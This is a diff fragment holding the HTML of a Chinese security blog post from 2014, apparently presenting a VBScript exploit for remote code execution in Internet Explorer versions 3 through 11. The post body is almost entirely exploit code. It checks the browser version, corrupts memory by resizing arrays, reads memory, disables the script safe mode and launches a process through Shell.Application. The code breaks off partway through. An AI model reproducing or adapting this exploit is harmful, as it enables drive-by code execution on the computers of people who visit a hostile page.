@@ -1,30 +1,909 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><meta name="viewport" content="initial-scale=1.0,maximum-scale=5,width=device-width,viewport-fit=cover"><title>win95+ie3-win10+ie11 浏览器执行漏洞 - 老D博客</title><meta name="keywords" content="IE漏洞,浏览器执行漏洞" /><meta name="description" content="//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allie(win95+ie3-win10+ie11)&nbsp;dve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!doctype&nbsp;html&gt;&nbsp;&nbsp;&lt;html&gt;&nbsp;&nbsp;&lt;me..." /><meta property="og:type" content="article" /><meta property="og:url" content="https://laod.cn/security/win10-ie11-0day.html" /><meta property="og:site_name" content="老D博客" /><meta property="og:title" content="win95+ie3-win10+ie11 浏览器执行漏洞" /><meta property="og:description" content="//*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allie(win95+ie3-win10+ie11)&nbsp;dve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!doctype&nbsp;html&gt;&nbsp;&nbsp;&lt;html&gt;&nbsp;&nbsp;&lt;me..." /><link rel="canonical" href="https://laod.cn/security/win10-ie11-0day.html" /><meta name="applicable-device" content="pc,mobile" /><meta http-equiv="Cache-Control" content="no-transform" /><link rel="shortcut icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><link rel='dns-prefetch' href='//cdn.laod.wang' /><link rel='dns-prefetch' href='//s2.ax1x.com' /><link rel='stylesheet' id='stylesheet-css' href='//laod.cn/wp-content/uploads/wpcom/style.6.8.2.1632028585.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='font-awesome-css' href='https://laod.cn/wp-content/themes/justnews/themer/assets/css/font-awesome.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='wp-block-library-css' href='https://laod.cn/wp-includes/css/dist/block-library/style.min.css?ver=5.9.1' type='text/css' media='all' /><style id='global-styles-inline-css' type='text/css'>body{--wp--preset--color--black:#000;--wp--preset--color--cyan-bluish-gray:#abb8c3;--wp--preset--color--white:#fff;--wp--preset--color--pale-pink:#f78da7;--wp--preset--color--vivid-red:#cf2e2e;--wp--preset--color--luminous-vivid-orange:#ff6900;--wp--preset--color--luminous-vivid-amber:#fcb900;--wp--preset--color--light-green-cyan:#7bdcb5;--wp--preset--color--vivid-green-cyan:#00d084;--wp--preset--color--pale-cyan-blue:#8ed1fc;--wp--preset--color--vivid-cyan-blue:#0693e3;--wp--preset--color--vivid-purple:#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple:linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan:linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange:linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red:linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray:linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum:linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple:linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux:linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk:linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean:linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass:linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight:linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale:url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale:url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow:url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red:url('#wp-duotone-blue-red');--wp--preset--duotone--midnight:url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow:url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green:url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange:url('#wp-duotone-blue-orange');--wp--preset--font-size--small:13px;--wp--preset--font-size--medium:20px;--wp--preset--font-size--large:36px;--wp--preset--font-size--x-large:42px}.has-black-color{color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-color{color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-color{color:var(--wp--preset--color--white)!important}.has-pale-pink-color{color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-color{color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-color{color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-color{color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-color{color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-color{color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-color{color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-color{color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-color{color:var(--wp--preset--color--vivid-purple)!important}.has-black-background-color{background-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-background-color{background-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-background-color{background-color:var(--wp--preset--color--white)!important}.has-pale-pink-background-color{background-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-background-color{background-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-background-color{background-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-background-color{background-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-background-color{background-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-background-color{background-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-background-color{background-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-background-color{background-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-background-color{background-color:var(--wp--preset--color--vivid-purple)!important}.has-black-border-color{border-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-border-color{border-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-border-color{border-color:var(--wp--preset--color--white)!important}.has-pale-pink-border-color{border-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-border-color{border-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-border-color{border-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-border-color{border-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-border-color{border-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-border-color{border-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-border-color{border-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-border-color{border-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-border-color{border-color:var(--wp--preset--color--vivid-purple)!important}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background:var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple)!important}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background:var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan)!important}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange)!important}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red)!important}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background:var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray)!important}.has-cool-to-warm-spectrum-gradient-background{background:var(--wp--preset--gradient--cool-to-warm-spectrum)!important}.has-blush-light-purple-gradient-background{background:var(--wp--preset--gradient--blush-light-purple)!important}.has-blush-bordeaux-gradient-background{background:var(--wp--preset--gradient--blush-bordeaux)!important}.has-luminous-dusk-gradient-background{background:var(--wp--preset--gradient--luminous-dusk)!important}.has-pale-ocean-gradient-background{background:var(--wp--preset--gradient--pale-ocean)!important}.has-electric-grass-gradient-background{background:var(--wp--preset--gradient--electric-grass)!important}.has-midnight-gradient-background{background:var(--wp--preset--gradient--midnight)!important}.has-small-font-size{font-size:var(--wp--preset--font-size--small)!important}.has-medium-font-size{font-size:var(--wp--preset--font-size--medium)!important}.has-large-font-size{font-size:var(--wp--preset--font-size--large)!important}.has-x-large-font-size{font-size:var(--wp--preset--font-size--x-large)!important}</style> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/jquery-3.6.0.min.js?ver=3.6.0' id='jquery-core-js'></script> <script type='text/javascript' src='https://laod.cn/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/icons-2.6.18.js?ver=6.8.2' id='wpcom-icons-js'></script> <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://laod.cn/xmlrpc.php?rsd" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://laod.cn/wp-includes/wlwmanifest.xml" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="32x32" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="192x192" /><link rel="apple-touch-icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><meta name="msapplication-TileImage" content="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /> <noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player,[data-lazy-src]{display:none!important}</style></noscript> <!--[if lte IE 9]><script src="https://laod.cn/wp-content/themes/justnews/js/update.js"></script><![endif]--></head><body class="post-template-default single single-post postid-247 single-format-standard lang-cn el-boxed"><header class="header"><div class="container clearfix"><div class="navbar-header"> <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse" aria-label="menu"> <span class="icon-bar icon-bar-1"></span> <span class="icon-bar icon-bar-2"></span> <span class="icon-bar icon-bar-3"></span> </button><div class="logo"> <a href="https://laod.cn" rel="home"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="老D博客" data-lazy-src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png"><noscript><img src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png" alt="老D博客"></noscript></a></div></div><div class="collapse navbar-collapse"><nav class="navbar-left primary-menu"><ul id="menu-x" class="nav navbar-nav wpcom-adv-menu"><li class="zmzm-shouye menu-item"><a href="https://laod.cn">首页</a></li><li class="zmzm-feiji1 menu-item"><a href="https://laod.cn/hosts">hosts</a></li><li class="zmzm-gongju menu-item"><a href="https://laod.cn/tools">工具软件</a></li><li class="zmzm-code menu-item"><a href="https://laod.cn/code-audit">代码审计</a></li><li class="zmzm-keji menu-item"><a href="https://laod.cn/black-technology">黑科技</a></li><li class="zmzm-liuyan menu-item"><a href="https://laod.cn/guestbook">留言版</a></li><li class="zmzm-gengduo menu-item menu-item-style menu-item-style1 dropdown"><a href="#" class="dropdown-toggle">查看更多</a><ul class="dropdown-menu menu-item-wrap menu-item-col-4"><li class="zmzm-dianying menu-item"><a href="https://laod.cn/movie">电影·美剧</a></li><li class="zmzm-anquan menu-item current-post-ancestor current-post-parent active"><a href="https://laod.cn/security">网络安全</a></li><li class="zmzm-zixun menu-item"><a href="https://laod.cn/news">业界资讯</a></li><li class="zmzm-mianfei-copy menu-item"><a href="https://laod.cn/free">免费资源</a></li></ul></li></ul></nav><div class="navbar-action pull-right"><div class="navbar-search-icon j-navbar-search"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></div><div id="j-user-wrap"> <a class="login" href="https://laod.cn/login?modal-type=login">登录</a> <a class="login register" href="https://laod.cn/register?modal-type=register">注册</a></div></div><form class="navbar-search" action="https://laod.cn" method="get" role="search"><div class="navbar-search-inner"> <i class="wpcom-icon wi navbar-search-close"><svg aria-hidden="true"><use xlink:href="#wi-close"></use></svg></i> <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value=""> <button class="navbar-search-btn" type="submit"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></button></div></form></div></div></header><div id="wrap"><div class="wrap container"><main class="main"><article id="post-247" class="post-247 post type-post status-publish format-standard hentry category-security tag-ie tag-79 entry"><div class="entry-main"><div class="entry-head"><h1 class="entry-title">win95+ie3-win10+ie11 浏览器执行漏洞</h1><div class="entry-info"> <time class="entry-date published" datetime="2014-11-13T01:35:05+08:00" pubdate> 2014-11-13 01:35 </time> <span class="dot">•</span> <a href="https://laod.cn/security" rel="category tag">网络安全</a> <span class="dot">•</span> <span>阅读 2426</span></div></div><div class="entry-content text-indent"><div class="dp-highlighter"><div class="bar"></div><ol start="1" class="dp-c"><li class="alt"><span><span class="comment">//*</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;allie(win95+ie3-win10+ie11)&nbsp;dve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>*<span class="comment">//</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&lt;!doctype&nbsp;html&gt;&nbsp;&nbsp;</span></li><li class=""><span>&lt;html&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&lt;meta&nbsp;http-equiv=<span class="string">&#8220;X-UA-Compatible&#8221;</span><span>&nbsp;content=</span><span class="string">&#8220;IE=EmulateIE8&#8221;</span><span>&nbsp;&gt;&nbsp;&nbsp;</span></span></li><li class=""><span>&lt;head&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&lt;/head&gt;&nbsp;&nbsp;</span></li><li class=""><span>&lt;body&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&lt;SCRIPT&nbsp;LANGUAGE=<span class="string">&#8220;VBScript&#8221;</span><span>&gt;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;runmumaa()&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>set&nbsp;shell=createobject(<span class="string">&#8220;Shell.Application&#8221;</span><span>)&nbsp;&nbsp;</span></span></li><li class="alt"><span>shell.ShellExecute&nbsp;<span class="string">&#8220;notepad.exe&#8221;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&lt;/script&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&lt;SCRIPT&nbsp;LANGUAGE=<span class="string">&#8220;VBScript&#8221;</span><span>&gt;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;aa()&nbsp;&nbsp;</span></li><li class="alt"><span>dim&nbsp;&nbsp;&nbsp;ab()&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;a0&nbsp;&nbsp;</span></li><li class="alt"><span>dim&nbsp;&nbsp;&nbsp;a1&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;a2&nbsp;&nbsp;</span></li><li class="alt"><span>dim&nbsp;&nbsp;&nbsp;a3&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;win9x&nbsp;&nbsp;</span></li><li class="alt"><span>dim&nbsp;&nbsp;&nbsp;intVersion&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;rnda&nbsp;&nbsp;</span></li><li class="alt"><span>dim&nbsp;&nbsp;&nbsp;funclass&nbsp;&nbsp;</span></li><li class=""><span>dim&nbsp;&nbsp;&nbsp;myarray&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>Begin()&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;Begin()&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;info=Navigator.UserAgent&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;<span class="keyword">if</span><span>(instr(info,</span><span class="string">&#8220;Win64&#8221;</span><span>)&gt;0)&nbsp;&nbsp;&nbsp;then&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;<span class="keyword">if</span><span>&nbsp;(instr(info,</span><span class="string">&#8220;MSIE&#8221;</span><span>)&gt;0)&nbsp;&nbsp;&nbsp;then&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intVersion&nbsp;=&nbsp;CInt(Mid(info,&nbsp;InStr(info,&nbsp;<span class="string">&#8220;MSIE&#8221;</span><span>)&nbsp;+&nbsp;5,&nbsp;2))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;<span class="keyword">else</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;win9x=0&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;BeginInit()&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;If&nbsp;Create()=True&nbsp;Then&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myarray=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chrw(01)&amp;chrw(2176)&amp;chrw(01)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myarray=myarray&amp;chrw(00)&amp;chrw(32767)&amp;chrw(00)&amp;chrw(0)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>(intVersion&lt;4)&nbsp;then&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(<span class="string">&#8220;&lt;br&gt;&nbsp;IE&#8221;</span><span>)&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(intVersion)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;runshellcode()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setnotsafemode()&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;BeginInit()&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Randomize()&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;redim&nbsp;aa(5)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;redim&nbsp;ab(5)&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;a0=13+17*rnd(6)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;a3=7+3*rnd(5)&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;Create()&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;dim&nbsp;i&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;Create=False&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;For&nbsp;i&nbsp;=&nbsp;0&nbsp;To&nbsp;400&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;If&nbsp;Over()=True&nbsp;Then&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&#8216;&nbsp;&nbsp;&nbsp;document.write(i)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create=True&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;For&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;Next&nbsp;&nbsp;</span></li><li class="alt"><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>sub&nbsp;testaa()&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;sub&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;mydata()&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i=testaa&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i=<span class="keyword">null</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1)=i&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=6.36598737437801E-314&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1+2)=myarray&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(2)=1.74088534731324E-310&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mydata=aa(a1)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span><span class="keyword">function</span><span>&nbsp;setnotsafemode()&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;i=mydata()&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;i=readmemo(i+8)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;i=readmemo(i+16)&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h134)&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">for</span><span>&nbsp;k=0&nbsp;to&nbsp;&amp;h60&nbsp;step&nbsp;4&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h120+k)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>(j=14)&nbsp;then&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1+2)(i+&amp;h11c+k)=ab(4)&nbsp;&nbsp;</span></li><li 